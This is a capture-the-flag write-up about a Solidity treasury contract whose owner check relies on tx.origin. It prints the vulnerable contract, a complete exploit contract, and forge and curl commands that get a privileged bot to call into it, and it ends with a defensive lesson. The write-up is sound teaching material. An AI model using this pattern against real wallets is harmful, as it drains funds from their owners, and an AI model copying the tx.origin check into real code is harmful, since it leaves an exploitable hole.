# Gullwing DAO Treasury — tx.origin phishing (Black Hat India 2026 CTF)

**Flag:** `BlackHatIndia{tx_0r1g1n_1s_n0t_y0ur_c4ll3r_th3_tr34sur3r_g0t_ph1sh3d_4b4a63f2}`

## Prompt (paraphrased)

A DAO keeps 10 ETH in a `TreasuryWallet` that only the treasurer (an
automated off-chain bot) can move funds from. The bot "loves free
airdrops": hand it a contract address via `POST /action/visit` and it
calls `claimAirdrop()` on that contract from its own account. Empty the
treasury.

## Source

```solidity
// TreasuryWallet.sol
contract TreasuryWallet {
    address public owner;
    modifier onlyOwner() {
        require(tx.origin == owner, "not owner");   // <-- the bug
        _;
    }
    function withdrawAll(address payable to) external onlyOwner {
        uint256 amount = address(this).balance;
        (bool ok, ) = to.call{value: amount}("");
        require(ok, "transfer failed");
        emit Transfer(to, amount);
    }
    ...
}
```

`Setup.sol` deploys the wallet with the treasurer bot's EOA as owner and
seeds it with 10 ETH.

## Vulnerability

`onlyOwner` checks `tx.origin == owner` instead of `msg.sender == owner`.
`tx.origin` is the ORIGINAL external account that started the whole
transaction chain, not the immediate caller — it stays equal to the
treasurer's EOA even when the treasurer calls into an attacker-controlled
contract, which itself calls further into the treasury. A classic
"tx.origin phishing" setup: get a privileged account to initiate a call
into your contract, then pivot from inside that call.

## Exploit

```solidity
// Exploit.sol
interface ITreasuryWallet {
    function withdrawAll(address payable to) external;
}

contract Exploit {
    address payable public immutable loot;
    ITreasuryWallet public immutable wallet;

    constructor(address payable _loot, address _wallet) {
        loot = _loot;
        wallet = ITreasuryWallet(_wallet);
    }

    // called by the treasurer bot; tx.origin is still the treasurer here
    function claimAirdrop() external {
        wallet.withdrawAll(loot);
    }
}
```

1. Deploy `Exploit` from the player key, constructor args = (player
   address, treasury wallet address).
2. `POST /action/visit {"instance": ID, "contract": "<Exploit address>"}`
   — the bot calls `claimAirdrop()` on it from its own EOA.
3. Inside that call, `Exploit.claimAirdrop()` calls
   `TreasuryWallet.withdrawAll(player)`. `tx.origin` is still the
   treasurer bot's address throughout this whole nested call, so
   `onlyOwner` passes and the full 10 ETH is sent to the player.

One visit was enough: wallet balance 10 ETH → 0 ETH, `Setup.isSolved()`
flips to `true`.

```bash
forge create src/Exploit.sol:Exploit \
  --rpc-url "$RPC" --private-key "$PK" --broadcast \
  --constructor-args "$PLAYER" "$WALLET"

curl -s -X POST "$BASE/action/visit" -H 'Content-Type: application/json' \
  -d '{"instance":"<ID>","contract":"<Exploit address>"}'
```

## Lesson

Never use `tx.origin` for authorization. Use `msg.sender`. Any contract
that can get a privileged EOA to initiate a transaction (an "airdrop
claim" callback, a relayer, a bot that interacts with arbitrary addresses)
can trivially bypass `tx.origin`-based checks by chaining a call through
an attacker contract.
